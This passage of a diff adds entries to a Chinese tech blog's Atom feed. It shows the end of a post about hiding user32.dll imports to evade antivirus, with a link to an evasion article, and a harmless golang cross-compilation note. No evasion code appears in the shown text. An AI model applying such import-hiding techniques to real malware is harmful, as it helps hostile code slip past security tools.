alt="image-20230117144717784"></p><p>上面已经说的很详细了，这里就不再解读了。</p><p><img src="/../../images/c%E5%92%8Cc++%E7%9B%B8%E5%85%B3%E7%AC%94%E8%AE%B0/image-20230117144926796.png" alt="image-20230117144926796"></p><p>MessageBox的语法上图已经给出来了。通过上面的一些微软的官方文档，就很容易理解上述隐藏user32.dll的代码是啥意思了，亦可以照猫画虎隐藏其他dll文件。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://learn.microsoft.com/zh-cn/cpp/c-language/?view=msvc-170">c语言参考文档</a></li><li><a href="https://xz.aliyun.com/t/12035">通过隐藏导入表的方式规避杀软</a></li><li><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/">win32api文档</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;多线程卷起来，要把理论落实到实践中去，一点点积累起来逆向的基础，一点点学习和杀软对抗，迟早有一天我也能成为re大佬。这篇文章主要记录一下学习</summary>
+      
+    
+    
+    
+    
+    <category term="c" scheme="https://blog.njcit.me/tags/c/"/>
+    
+    <category term="c++" scheme="https://blog.njcit.me/tags/c/"/>
+    
+    <category term="代码" scheme="https://blog.njcit.me/tags/%E4%BB%A3%E7%A0%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>golang学习笔记</title>
+    <link href="https://blog.njcit.me/2023/01/12/%E5%86%99%E4%BB%A3%E7%A0%81/golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <id>https://blog.njcit.me/2023/01/12/%E5%86%99%E4%BB%A3%E7%A0%81/golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
+    <published>2023-01-12T12:38:52.000Z</published>
+    <updated>2023-02-06T02:25:36.361Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着golang越来越火，终于下定决心系统学一下golang，本身有一点Java&#x2F;Python&#x2F;PHP基础，以为只要学一下golang的语法就可以愉快的开发了，实际操作发现不是这样，本篇文章主要记录学习golang过程中遇到的坑。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>Windows 下编译 Mac 和 Linux 64位可执行程序</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SET</span> CGO_ENABLED=<span class="number">0</span></span><br><span class="line"><span class="built_in">SET</span> GOOS=darwin</span><br><span class="line"><span class="built_in">SET</span> GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line"></span><br><span class="line"><span class="built_in">SET</span> CGO_ENABLED=<span class="number">0</span></span><br><span class="line"><span class="built_in">SET</span> GOOS=linux</span><br><span class="line"><span class="built_in">SET</span> GOARCH=amd64</span><br><span class="line">go build main.go</span><br></pre></td></tr></table></figure><p>Linux 下编译 Mac 和 Windows 64位可执行程序</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=<span class="number">0</span> GOOS=darwin GOARCH=amd64 go build main.go</span><br><span class="line">CGO_ENABLED=<span class="number">0</span> GOOS=windows GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://blog.csdn.net/panshiqu/article/details/53788067">https://blog.csdn.net/panshiqu/article/details/53788067</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;随着golang越来越火，终于下定决心系统学一下golang，本身有一点Java&amp;#x2F;Python&amp;#x2F;PHP基础，以为只要学一</summary>
+      
+    
+    
+    
+    
+    <category term="开发" scheme="https://blog.njcit.me/tags/%E5%BC%80%E5%8F%91/"/>
+    
+    <category term="golang" scheme="https://blog.njcit.me/tags/golang/"/>
+    
+  </entry>
+  
+</feed>
